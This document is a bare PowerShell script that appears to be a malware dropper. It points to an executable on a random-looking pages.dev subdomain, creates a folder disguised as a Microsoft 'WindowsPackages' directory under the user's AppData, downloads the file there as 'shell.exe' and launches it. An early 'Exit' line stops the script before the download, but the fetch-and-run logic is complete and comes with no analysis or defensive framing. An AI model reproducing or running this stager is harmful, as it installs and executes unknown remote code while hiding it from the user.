$url = "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/files/windowspackages.exe"
$folderPath = "$env:USERPROFILE\AppData\Local\Microsoft\WindowsPackages"
$localPath = "$folderPath\shell.exe"
Exit
if (-Not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath
}

if (-Not (Test-Path $localPath)) {
    Invoke-WebRequest -Uri $url -OutFile $localPath
}

Start-Process $localPath
